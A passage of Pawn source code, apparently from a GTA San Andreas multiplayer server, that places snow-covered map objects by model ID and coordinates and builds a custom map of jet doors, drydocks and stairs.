	AddSnowObject(6281, 570.74218, -1868.34375, 1.67968, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6443, 301.93750, -1657.81250, 19.64843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6313, 437.19531, -1679.44531, 19.22656, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6316, 199.40629, -1626.73437, 12.37500, 0.00000, 0.00000, 133.05000);
	AddSnowObject(6312, 202.71093, -1580.11718, 22.47656, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6317, 270.29687, -1613.60156, 32.19531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6305, 328.57031, -1612.57812, 31.93750, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6320, 297.50000, -1490.30468, 32.09375, 0.00000, 0.00000, 31.96500);
	AddSnowObject(6345, 236.54690, -1498.31250, 21.75000, 0.00000, 0.00000, 337.82998);
	AddSnowObject(6347, 238.17968, -1509.85156, 22.11718, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6321, 270.69531, -1576.20312, 31.89843, 0.00000, 0.00000, 345.65499);
	AddSnowObject(6341, 332.89062, -1500.06250, 29.87500, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6323, 416.46881, -1446.08593, 30.79687, 0.00000, 0.00000, 36.04999);
	AddSnowObject(6319, 444.21881, -1376.51562, 24.67187, 0.00000, 0.00000, 28.30500);
	AddSnowObject(6318, 572.95312, -1328.72656, 13.07031, 0.00000, 0.00000, 14.27000);
	AddSnowObject(6324, 632.57812, -1443.09375, 13.68750, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6508, 624.70312, -1252.11718, 14.87500, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6331, 473.82031, -1437.41406, 21.69531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6302, 576.14062, -1406.25781, 13.76562, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6322, 496.27343, -1500.14062, 16.66406, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6304, 444.00000, -1521.40625, 27.19531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6303, 359.21090, -1523.76562, 31.59375, 0.00000, 0.00000, 38.40999);
	AddSnowObject(6343, 389.48437, -1528.78906, 28.50781, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6333, 422.00000, -1583.10156, 23.69531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6329, 557.53906, -1577.91406, 15.03125, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6307, 491.46875, -1630.75000, 20.07812, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6306, 428.05468, -1654.95312, 24.92187, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6308, 565.81250, -1671.28125, 16.36718, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6398, 552.53125, -1695.57812, 15.54687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6064, 688.53125, -1877.96093, 2.01562, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6309, 576.64062, -1730.42187, 11.88281, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6291, 631.66406, -1647.45312, 14.38281, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6225, 724.81250, -1673.65625, 11.62500, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6227, 676.61718, -1668.96093, 3.85156, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6231, 753.04687, -1676.26562, 8.14062, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6119, 810.87500, -1703.42968, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6229, 773.20312, -1667.99218, 2.93750, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6188, 836.31250, -1866.75781, -0.53906, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6120, 845.66406, -1607.29687, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6189, 836.44531, -2003.52343, -2.64062, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6114, 1044.78906, -1572.26562, 12.52343, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6121, 926.75000, -1572.27343, 12.51562, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6124, 742.40625, -1595.16406, 13.52343, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6111, 784.50000, -1496.20312, 12.39843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6135, 764.32031, -1509.04687, 16.82812, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6094, 731.15625, -1506.53125, 3.75000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6132, 674.67187, -1483.29687, 17.75000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6301, 717.48437, -1362.77343, 12.51562, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6487, 713.56250, -1236.21875, 17.82031, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13700, 536.40625, -1087.24218, 64.62500, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13703, 495.41406, -957.49218, 79.33593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13872, 587.67187, -958.76562, 65.35156, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13689, 567.82812, -1031.39843, 71.59375, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13688, 689.69531, -1023.00000, 50.46875, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13698, 650.87500, -1076.07812, 38.83593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5765, 819.57812, -986.02337, 35.93750, 0.00000, 0.00000, 116.42299);
	AddSnowObject(5753, 850.82812, -1013.78125, 30.25781, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5755, 796.46093, -1111.12500, 23.18750, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6507, 696.89837, -1138.50000, 18.19531, 0.00000, 0.00000, 191.77600);
	AddSnowObject(6488, 723.09375, -1144.20312, 24.50000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5756, 797.91406, -1234.44531, 17.71875, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5805, 869.92187, -1144.73437, 22.75781, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5871, 879.57031, -1092.87500, 26.15625, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5864, 849.91406, -1196.68750, 19.40625, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5865, 892.79687, -1268.61718, 19.72656, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5863, 912.88281, -1194.32812, 20.73437, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5705, 830.86718, -1269.12500, 20.85937, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5796, 859.89062, -1323.78906, 12.37500, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6490, 717.48437, -1357.30468, 20.29687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5798, 797.35156, -1357.64062, 12.54687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5862, 847.35156, -1400.48437, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13693, 560.28125, -1184.89843, 44.22656, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13686, 553.59375, -1164.53125, 51.34375, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5754, 962.60156, -1056.30468, 30.37500, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5807, 1041.99218, -1039.29687, 30.19531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5875, 1022.64062, -1080.32812, 27.25781, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5758, 1012.59375, -1145.08593, 22.75781, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5757, 943.43750, -1220.53125, 17.61718, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5759, 1058.11718, -1234.76562, 17.60156, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5747, 1084.46875, -1048.88281, 32.07031, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5748, 1133.00781, -1145.96875, 22.77343, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5878, 1122.65625, -1080.45312, 26.73437, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5752, 989.11718, -966.10156, 39.50781, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5866, 916.57812, -952.71093, 43.07031, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5718, 901.23437, -967.47662, 47.65625, 0.00000, 0.00000, 10.00000);
	AddSnowObject(5987, 913.71875, -918.58593, 49.34375, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5853, 1018.16412, -908.97662, 43.64843, 0.00000, 0.00000, 7.71999);
	AddSnowObject(5896, 1103.52343, -896.92968, 63.89843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13711, 994.05468, -841.23437, 75.50000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5802, 1124.57031, -950.24218, 41.75781, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13814, 850.87500, -912.80468, 58.14062, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13813, 817.73437, -917.84375, 54.37500, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13716, 849.37500, -828.64843, 73.56250, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13713, 970.15625, -818.52343, 90.96093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13887, 967.20312, -715.27343, 107.97656, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13804, 1077.60937, -651.60937, 114.28906, 0.00000, 0.00000, 144.86500);
	AddSnowObject(13717, 1161.32031, -755.01562, 84.80468, 0.00000, 0.00000, 8.92500);
	AddSnowObject(13784, 1156.85937, -852.75781, 49.35937, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5741, 1196.84375, -914.86718, 41.96875, 0.00000, 0.00000, 9.50000);
	AddSnowObject(5743, 1265.29687, -889.95312, 40.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5746, 1163.17187, -1046.42968, 32.29687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5745, 1262.95312, -1037.64843, 32.07031, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5801, 1266.13281, -1037.72656, 28.40625, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5806, 1149.63281, -1039.24218, 30.94531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5881, 1310.02343, -985.43750, 41.90625, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5793, 1365.47656, -998.26562, 30.32812, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5887, 1212.76562, -1090.07812, 26.37500, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5717, 1212.91406, -988.73437, 42.75781, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5823, 1140.17968, -1207.25781, 18.82031, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4649, 1425.16406, -1035.25781, 24.19531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4650, 1482.25000, -1097.30468, 22.85937, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5800, 1355.72656, -1089.84375, 24.33593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4584, 1419.78906, -1096.96093, 20.06250, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5799, 1350.15625, -1170.82031, 19.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6007, 1308.24218, -1088.84375, 26.75000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4651, 1539.85937, -1087.31250, 22.72656, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4568, 1529.90625, -1096.78125, 22.40625, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4652, 1539.84375, -1161.74218, 23.00000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4567, 1646.46093, -1161.70312, 22.86718, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4710, 1762.11718, -1170.89062, 22.76562, 0.00000, 0.00000, 180.00000);
	AddSnowObject(4591, 1753.75781, -1231.39843, 12.44531, 0.00000, 0.00000, 180.00000);
	AddSnowObject(4654, 1715.46093, -1230.87500, 18.26562, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4643, 1654.76562, -1246.28906, 16.17187, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5436, 1987.00000, -1408.00000, 17.00000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5500, 1948.95312, -1461.20312, 12.46875, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4589, 1780.00000, -1281.00000, 13.00000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4592, 1798.46093, -1223.46093, 17.54687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4556, 1660.04687, -1340.72656, 15.63281, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4646, 1650.83593, -1300.85937, 15.54687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4684, 1661.54687, -1216.45312, 16.27343, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4562, 1574.59375, -1248.10156, 15.39843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4685, 1572.59375, -1216.50000, 17.50000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4565, 1513.69531, -1204.80468, 18.50000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4648, 1419.67968, -1150.12500, 22.86718, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4679, 1607.88281, -1324.62500, 32.72656, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4553, 1530.83593, -1300.85156, 15.54687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4647, 1454.75781, -1309.12500, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4551, 1410.16406, -1333.39062, 9.92187, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4644, 1416.19531, -1210.87500, 17.59375, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5750, 1350.15625, -1250.83593, 14.13281, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5859, 1350.14843, -1353.36718, 12.47656, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5739, 1288.04687, -1203.77343, 17.68750, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5751, 1283.73437, -1145.08593, 22.61718, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5804, 1213.76562, -1177.09375, 19.75000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5707, 1269.39843, -1256.96093, 14.52343, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6006, 1183.69531, -1241.35937, 16.27343, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5857, 1259.43750, -1246.81250, 17.10937, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5749, 1144.40625, -1251.48437, 15.10937, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5703, 998.15625, -1220.82031, 15.83593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5812, 1230.89062, -1337.98437, 12.53906, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5794, 1200.90625, -1337.99218, 12.39843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5810, 1114.31250, -1348.10156, 17.98437, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5994, 1259.22656, -1400.40625, 10.78125, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5995, 1130.05468, -1400.70312, 12.52343, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5860, 1058.14843, -1363.26562, 12.61718, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5795, 985.72656, -1324.79687, 12.45312, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5732, 1014.02343, -1361.46093, 20.35156, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5808, 1255.24218, -1337.96093, 12.32812, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5809, 1281.43750, -1337.95312, 12.37500, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6035, 1329.03125, -1479.07812, 12.46093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6101, 1268.24218, -1467.84375, 11.82031, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6129, 1205.11718, -1572.27343, 12.42187, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6125, 1196.03906, -1489.07031, 12.37500, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6130, 1117.58593, -1490.00781, 32.71875, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5861, 979.94531, -1400.49218, 12.36718, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6055, 1050.08593, -1489.03906, 12.53906, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6113, 984.29687, -1491.40625, 12.50000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6152, 990.08593, -1450.08593, 12.77343, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6160, 982.61718, -1530.82812, 12.83593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6112, 917.50000, -1489.10156, 12.29687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6217, 846.45312, -1523.52343, 12.35156, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6059, 855.09375, -1461.80468, 12.79687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5815, 877.16406, -1361.20312, 12.45312, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5797, 917.35937, -1361.24218, 12.38281, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5784, 988.27337, -1289.63281, 15.37500, 0.00000, 0.00000, 180.00000);
	AddSnowObject(5760, 1016.92968, -1249.92968, 18.50000, 0.00000, 0.00000, 270.00000);
	AddSnowObject(4879, 1374.25781, -2184.03906, 21.07812, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17665, 2604.34375, -1220.23437, 54.75000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17629, 2338.92968, -1299.60156, 23.03125, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5624, 2136.72656, -975.82812, 58.10937, 0.00000, 0.00000, 345.00500);
	return true;
}
stock AdaugaZapadaPeObiect_Paint(modelid, Float:x, Float:y, Float:z, Float:rx, Float:ry, Float:rz)
{
	new objectsnow = CreateDynamicObject(modelid, x + 0.05, y + 0.075, z + 0.1, rx, ry, rz, 69, -1, -1, 300.0, 0.0);
	for(new a = 0; a < 30; a++)
	{
		SetDynamicObjectMaterial(objectsnow, a, 17944, "lngblok_lae2", "white64bumpy", 0);
	}	
	return objectsnow;
}
stock MapaFySnow()
{
	new id = 0;
	new punezapada[96];
	for(new i = 0; i < 96; i++) { punezapada[i] = -1; }
	AdaugaZapadaPeObiect_Paint(4242, 39.2486,1511.9365,11.7500,0,0,0);
	punezapada[id] = CreateDynamicObject(3095,34.65234375,1530.50878906,11.74998474,90.00000000,179.99450684,270.00000000, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,47.25976562,1536.04003906,10.10000992,90.00000000,167.39318848,102.60131836, 69); id++;  //object(a51_jetdoor) (12)
	CreateDynamicObject(10828,51.23812485,1536.33789062,14.27626228,0.00000000,0.00000000,90.00000000, 69); //object(drydock1_sfse) (2)
	CreateDynamicObject(10828,51.52263641,1504.20068359,14.27626228,0.00000000,0.00000000,90.00000000, 69); //object(drydock1_sfse) (3)
	CreateDynamicObject(10828,34.81420898,1553.22460938,14.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (4)
	CreateDynamicObject(10828,1.28663719,1553.19982910,14.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (5)
	CreateDynamicObject(10828,-11.77120113,1553.18066406,14.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (6)
	CreateDynamicObject(10828,35.03050232,1487.59265137,14.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (7)
	CreateDynamicObject(10828,1.66545463,1487.61254883,14.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (8)
	CreateDynamicObject(10828,-10.17134476,1487.61120605,14.27626228,0.00000000,0.00000000,0.00000000, 69); //object(drydock1_sfse) (9)
	CreateDynamicObject(10828,-28.15435600,1536.80700684,14.27626228,0.00000000,0.00000000,90.00000000, 69); //object(drydock1_sfse) (10)
	CreateDynamicObject(10828,-28.17258453,1504.32299805,14.27626228,0.00000000,0.00000000,90.00000000, 69); //object(drydock1_sfse) (11)
	punezapada[id] = CreateDynamicObject(3095,51.42480469,1535.85449219,12.49035358,0.00000000,0.00000000,0.00000000, 69); id++;  //object(a51_jetdoor) (13)
	punezapada[id] = CreateDynamicObject(3095,51.43345642,1527.00708008,12.49035358,0.00000000,0.00000000,0.00000000, 69); id++;  //object(a51_jetdoor) (14)
	punezapada[id] = CreateDynamicObject(3095,51.43864441,1518.08544922,12.49035358,0.00000000,0.00000000,0.00000000, 69); id++;  //object(a51_jetdoor) (15)
	punezapada[id] = CreateDynamicObject(3095,51.44348526,1509.30102539,12.49035358,0.00000000,0.00000000,0.00000000, 69); id++;  //object(a51_jetdoor) (16)
	punezapada[id] = CreateDynamicObject(3095,51.44433594,1504.60839844,12.49035358,0.00000000,0.00000000,0.00000000, 69); id++;  //object(a51_jetdoor) (17)
	CreateDynamicObject(14407,49.16015625,1542.91992188,10.41762352,13.99658203,0.00000000,0.00000000, 69); //object(carter-stairs01) (1)
	CreateDynamicObject(14407,48.90566254,1542.90454102,10.41762352,13.99658203,0.00000000,0.00000000, 69); //object(carter-stairs01) (2)
	CreateDynamicObject(14407,49.03417969,1497.58398438,10.41762352,13.99658203,0.00000000,179.99450684, 69); //object(carter-stairs01) (3)
	punezapada[id] = CreateDynamicObject(3095,47.24609375,1541.74414062,8.35001373,55.99731445,270.00000000,0.00000000, 69); id++;  //object(a51_jetdoor) (19)
	punezapada[id] = CreateDynamicObject(3095,47.25976562,1527.07812500,10.10000992,90.00000000,187.17956543,82.80944824, 69); id++;  //object(a51_jetdoor) (20)
	punezapada[id] = CreateDynamicObject(3095,47.24652863,1511.20971680,10.10000992,90.00000000,174.34375000,95.63970947, 69); id++;  //object(a51_jetdoor) (23)
	punezapada[id] = CreateDynamicObject(3095,47.26269531,1504.52832031,10.10000992,90.00000000,174.98175049,94.99078369, 69); id++;  //object(a51_jetdoor) (24)
	punezapada[id] = CreateDynamicObject(3095,47.21206665,1498.36083984,8.45001221,60.00000000,90.00000000,177.97253418, 69); id++;  //object(a51_jetdoor) (25)
	punezapada[id] = CreateDynamicObject(3095,47.26269531,1518.37597656,9.57501793,90.00000000,174.34399414,95.62857056, 69); id++;  //object(a51_jetdoor) (26)
	punezapada[id] = CreateDynamicObject(3095,47.24073792,1524.42919922,10.84999847,90.00000000,173.77075195,96.21276855, 69); id++;  //object(a51_jetdoor) (27)
	punezapada[id] = CreateDynamicObject(3095,47.25384140,1513.93176270,10.84999847,90.00000000,174.90673828,95.07125854, 69); id++;  //object(a51_jetdoor) (28)
	punezapada[id] = CreateDynamicObject(3095,50.98242188,1519.11218262,16.77499962,25.00488281,359.99450684,270.00000000, 69); id++;  //object(a51_jetdoor) (29)
	punezapada[id] = CreateDynamicObject(3095,31.04589844,1536.79296875,11.74998474,90.00000000,179.99450684,330.00732422, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,23.80078125,1536.79785156,11.74998474,90.00000000,180.00549316,29.98724365, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,20.18457031,1530.52246094,11.74998474,90.00000000,179.99450684,90.00000000, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,31.03417969,1524.24121094,11.74998474,90.00000000,179.99450684,209.99818420, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,23.80664062,1524.25000000,11.74998474,90.00000000,179.99450684,150.00183105, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,25.77510071,1533.36083984,15.71060181,0.00000000,0.00000000,30.00000000, 69); id++;  //object(a51_jetdoor) (7)
	punezapada[id] = CreateDynamicObject(3095,29.07421875,1527.67968750,15.71060181,0.00000000,0.00000000,29.99267578, 69); id++;  //object(a51_jetdoor) (9)
	punezapada[id] = CreateDynamicObject(3095,25.80267334,1527.67309570,15.71060181,0.00000000,0.00000000,59.99633789, 69); id++;  //object(a51_jetdoor) (10)
	punezapada[id] = CreateDynamicObject(3095,29.04328346,1533.36083984,15.71060181,0.00000000,0.00000000,59.99084473, 69); id++;  //object(a51_jetdoor) (11)
	punezapada[id] = CreateDynamicObject(3095,30.68496323,1530.49865723,15.71060181,0.00000000,0.00000000,89.99450684, 69); id++;  //object(a51_jetdoor) (18)
	punezapada[id] = CreateDynamicObject(3095,24.17593765,1530.53210449,15.71060181,0.00000000,0.00000000,89.74182129, 69); id++;  //object(a51_jetdoor) (21)
	punezapada[id] = CreateDynamicObject(3095,34.51002121,1508.62951660,11.74998474,90.00000000,179.99450684,270.00000000, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,30.89443207,1502.34204102,11.74998474,90.00000000,180.00549316,209.98719788, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,30.89245224,1514.88989258,11.74998474,90.00000000,180.00549316,329.99633789, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,23.64057732,1514.90783691,11.74998474,90.00000000,179.99450684,29.99819946, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,20.01106834,1508.64367676,11.74998474,90.00000000,180.00549316,89.98904419, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,23.65430069,1502.35766602,11.74998474,90.00000000,179.99450684,150.00183105, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,28.87810707,1511.41296387,15.71060181,0.00000000,0.00000000,59.99084473, 69); id++;  //object(a51_jetdoor) (11)
	punezapada[id] = CreateDynamicObject(3095,25.61144066,1505.78076172,15.71060181,0.00000000,0.00000000,59.99084473, 69); id++;  //object(a51_jetdoor) (11)
	punezapada[id] = CreateDynamicObject(3095,23.97819901,1508.62524414,15.71060181,0.00000000,0.00000000,89.99182129, 69); id++;  //object(a51_jetdoor) (21)
	punezapada[id] = CreateDynamicObject(3095,30.56658173,1508.62255859,15.71060181,0.00000000,0.00000000,89.99182129, 69); id++;  //object(a51_jetdoor) (21)
	punezapada[id] = CreateDynamicObject(3095,25.61545181,1511.45898438,15.71060181,0.00000000,0.00000000,29.99267578, 69); id++;  //object(a51_jetdoor) (9)
	punezapada[id] = CreateDynamicObject(3095,28.91460991,1505.76220703,15.71060181,0.00000000,0.00000000,29.99267578, 69); id++;  //object(a51_jetdoor) (9)
	punezapada[id] = CreateDynamicObject(3095,6.62833643,1508.64367676,11.74998474,90.00000000,180.00549316,270.00000000, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,3.01666403,1514.92846680,11.74998474,90.00000000,179.99450684,330.00732422, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,-4.23550224,1514.90783691,11.74998474,90.00000000,179.99450684,29.99816895, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,-7.85967302,1508.64367676,11.74998474,90.00000000,179.99450684,90.00000000, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,-4.23170424,1502.36682129,11.74998474,90.00000000,180.00549316,149.99087524, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,3.00504375,1502.38854980,11.74998474,90.00000000,179.99450684,209.99818420, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,-3.87314034,1508.64025879,15.71060181,0.00000000,0.00000000,89.98901367, 69); id++;  //object(a51_jetdoor) (21)
	punezapada[id] = CreateDynamicObject(3095,2.66856790,1508.63549805,15.71060181,0.00000000,0.00000000,89.98901367, 69); id++;  //object(a51_jetdoor) (21)
	punezapada[id] = CreateDynamicObject(3095,1.05289316,1511.48193359,15.71060181,0.00000000,0.00000000,59.98901367, 69); id++;  //object(a51_jetdoor) (21)
	punezapada[id] = CreateDynamicObject(3095,-2.28103375,1505.80627441,15.71060181,0.00000000,0.00000000,59.98535156, 69); id++;  //object(a51_jetdoor) (21)
	punezapada[id] = CreateDynamicObject(3095,0.94809180,1505.77294922,15.71060181,0.00000000,0.00000000,29.98535156, 69); id++;  //object(a51_jetdoor) (21)
	punezapada[id] = CreateDynamicObject(3095,-2.23629141,1511.49279785,15.71060181,0.00000000,0.00000000,29.98168945, 69); id++;  //object(a51_jetdoor) (21)
	punezapada[id] = CreateDynamicObject(3095,6.67722559,1530.49829102,11.74998474,90.00000000,179.99450684,270.00000000, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,3.04909372,1536.81799316,11.74998474,90.00000000,180.00549316,329.74633789, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,-4.19387054,1536.82116699,11.74998474,90.00000000,180.00549316,30.23721313, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,-7.81074619,1530.51538086,11.74998474,90.00000000,179.99450684,90.00000000, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,-4.18481827,1524.23242188,11.74998474,90.00000000,179.99450684,150.00183105, 69); id++;  //object(a51_jetdoor) (8)
	punezapada[id] = CreateDynamicObject(3095,3.06161451,1524.20788574,11.74998474,90.00000000,180.00549316,209.98719788, 69); id++;  //object(a51_jetdoor) (8)
